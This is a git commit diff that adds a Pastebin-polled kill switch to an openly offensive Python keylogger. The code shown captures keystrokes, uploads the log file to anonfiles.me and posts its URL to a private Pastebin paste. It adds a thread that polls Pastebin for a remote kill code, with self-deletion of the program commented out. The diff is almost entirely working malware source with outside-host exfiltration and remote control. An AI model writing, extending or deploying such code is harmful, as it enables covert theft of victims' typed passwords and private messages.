6033c2496b5d309c24aba745f775bab8bb055a65
sc4r3d0ntf34r <sc4r3d0ntf34r@localhost.localdomain>
2023-09-22 02:39:17 -0400

    Added kill switch

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ import json
 import base64
 import wasabi
 import keyboard
+from time import sleep
 from os import remove
 import requests as req
 from threading import Timer, Thread
@@ -11,16 +12,20 @@ from datetime import datetime
 #Config necesary for interacting with pastebin
 req.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"
 
-API_DEV_KEY = "YOUR API_DEV_KEY HERE"
-API_USER_KEY = "YOUR API_USER_KEY HEY"
-PASTE_KEY = "KEY TO THE PASTE WHERE KILL CODE WILL BE"
-kill_code = "THE CODE THAT WILL KILL THE PROGRAM"
+API_DEV_KEY = "YOUR API_DEV_KEY"
+API_USER_KEY = "YOUR API_USER_KEY"
+PASTE_KEY = "THE KEY OF THE PASTE WERE KILL CODE WILL BE READ FROM"
+kill_code = "KILL CODE"
 
-#send report ever x seconds
+#send report every x seconds
 REPORT_TIMER = 30
 
+# Check for killswitch code every x seconds
+
+CHECK_TIME = 5
 
 # intialize wasabi printer
+# recommended to remove in production
 msg = wasabi.Printer()
 
 class keyLogger:
@@ -79,21 +84,22 @@ class keyLogger:
 		remove(f"{self.filename}.txt")
 
 	def upload(self):
+		"""
+			Upload the keylog report to anon files then add the file's
+			url to pastebin. You should see that your account will start to populate
+		"""
 		url = 'https://anonfiles.me/api/v1/upload'
 		msg.info("Uploading file...")
 		file = { "file": open(f"{self.filename}.txt", 'r')}
 		resp = req.post(url, files=file)
 		anon_url = json.loads(resp.text)['data']['file']['url']['full']
-		msg.good(f"File has been uploaded to {anon_url}")
 		self.create_paste(anon_url)
 		msg.info(f"created pasted with url")
 		file["file"].close()
 
 	def report(self):
-		"""Functiom that reports to file
-		todo:
-		-use random string instead of datetime
-		-add upload to anonfiles
+		"""
+		Functiom that reports to file
 		"""
 
 		# Check if there is something to log
@@ -113,6 +119,9 @@ class keyLogger:
 		timer.start()
 
 	def create_paste(self, anon_url):
+		"""
+			Create a paste containing log's url
+		"""
 		url = "https://pastebin.com/api/api_post.php"
 
 		data_obj = {
@@ -120,15 +129,45 @@ class keyLogger:
 			"api_user_key": API_USER_KEY,
 			"api_paste_code": anon_url,
 			"api_option": "paste",
-			"api_paste_private": 2
+			"api_paste_private": 2,
+			"api_paste_name": self.filename
 		}
 
-		resp = req.post(url, data=data_obj)
-		print(resp.text)
-		input()
+		req.post(url, data=data_obj)
 
 		return 0
 
+# Kill switch code
+def killer(check_time):
+	"""
+		Check for kill code every x seconds
+	"""
+    while True:
+        switch_code = check_switch()
+        if(switch_code == kill_code):
+            run_kill()
+        sleep(check_time)
+
+def check_switch():
+    url = "https://pastebin.com/api/api_raw.php"
+    
+    data_obj = {
+    	    "api_dev_key": API_DEV_KEY,
+    	    "api_user_key": API_USER_KEY,
+    	    "api_option": "show_paste",
+    	    "api_paste_key": PASTE_KEY
+    	}
+    	
+    switch_code = req.post(url, data=data_obj)
+    	
+    return switch_code.text
+
+def run_kill():
+	# cleanup commented out for testing
+    #remove(argv[0])
+
+    print("killing and exiting")
+    exit(2)
 
 def print_banner():
 	print("""
@@ -151,7 +190,9 @@ def print_banner():
 if __name__ == '__main__':
 	print_banner()
 	keylogger = keyLogger(REPORT_TIMER)
-	try:
-		keylogger.startLog()
-	except KeyboardInterrupt:
-		msg.fail("keylogger has stoped")
+
+	keylog_thread = Thread(target=keylogger.startLog, daemon=True, args=(REPORT_TIMER))
+	kill_thread = Thread(target=killer, args=(CHECK_TIME))
+
+	keylog_thread.start()
+	kill_thread.start()
